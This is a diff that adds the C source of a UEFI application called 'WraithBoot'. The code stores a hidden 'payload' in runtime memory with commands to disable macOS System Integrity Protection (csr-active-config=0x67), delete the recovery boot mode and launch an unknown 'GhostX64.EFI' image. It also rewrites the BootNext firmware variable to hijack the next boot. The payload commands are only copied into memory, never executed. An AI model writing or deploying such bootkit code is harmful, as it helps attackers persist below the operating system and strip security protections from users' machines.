@@ -1,0 +1,49 @@
+#include <Uefi.h>
+#include <Library/UefiLib.h>
+#include <Library/UefiBootServicesTableLib.h>
+#include <Library/MemoryAllocationLib.h>
+#include <Library/BaseMemoryLib.h>
+#include <Library/UefiRuntimeServicesTableLib.h>
+#include <Library/PrintLib.h>
+#include <Library/UefiApplicationEntryPoint.h>
+
+#define PAYLOAD_SIZE 0x1000
+
+EFI_STATUS
+EFIAPI
+UefiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable) {
+    VOID *HiddenArea;
+    CHAR8 *PayloadData = "[WRAITHBOOT_PAYLOAD]\n"
+                         "1|setvar csr-active-config=0x67\n"
+                         "2|deletevar recovery-boot-mode\n"
+                         "3|launch \\EFI\\Custom\\GhostX64.EFI\n";
+    UINTN DataSize = AsciiStrLen(PayloadData) + 1;
+
+    EFI_STATUS Status = gBS->AllocatePool(EfiRuntimeServicesData, PAYLOAD_SIZE, &HiddenArea);
+    if (EFI_ERROR(Status)) {
+        Print(L"Failed to allocate memory: %r\n", Status);
+        return Status;
+    }
+
+    SetMem(HiddenArea, PAYLOAD_SIZE, 0);
+    CopyMem(HiddenArea, PayloadData, DataSize);
+    
+    Print(L"WraithBoot memory payload mapped at %p\n", HiddenArea);
+
+    // Optional: Detect trigger to execute further logic
+    EFI_GUID gEfiGlobalVariableGuid = EFI_GLOBAL_VARIABLE;
+    UINT16 BootOrder = 0x0001;
+    Status = gRT->SetVariable(L"BootNext",
+                              &gEfiGlobalVariableGuid,
+                              EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
+                              sizeof(BootOrder),
+                              &BootOrder);
+    if (EFI_ERROR(Status)) {
+        Print(L"Failed to set BootNext: %r\n", Status);
+    } else {
+        Print(L"BootNext override to 0x%04x set.\n", BootOrder);
+    }
+
+    return EFI_SUCCESS;
+}
+
